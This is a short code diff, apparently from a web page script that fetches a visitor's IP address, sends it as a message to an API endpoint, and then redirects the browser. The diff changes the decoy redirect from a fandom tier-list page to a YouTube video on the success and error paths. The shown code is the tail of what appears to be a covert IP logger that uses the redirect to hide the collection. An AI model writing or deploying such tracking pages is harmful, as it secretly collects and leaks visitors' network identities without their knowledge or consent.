@@ -26,14 +26,14 @@ fetch(apiUrl)
       })
       .then(data => {
         console.log('Message sent');
-        window.location.replace("https://animeadventures.fandom.com/wiki/Tier_Lists");
+        window.location.replace("https://www.youtube.com/watch?v=Opxf6kYzJZc");
       })
       .catch(error => {
         console.error('Error sending message:', error);
-        window.location.replace("https://animeadventures.fandom.com/wiki/Tier_Lists");
+        window.location.replace("https://www.youtube.com/watch?v=Opxf6kYzJZc");
       });
   })
   .catch(error => {
     console.error('Error fetching IP address:', error);
-    window.location.replace("https://animeadventures.fandom.com/wiki/Tier_Lists");
+    window.location.replace("https://www.youtube.com/watch?v=Opxf6kYzJZc");
   });
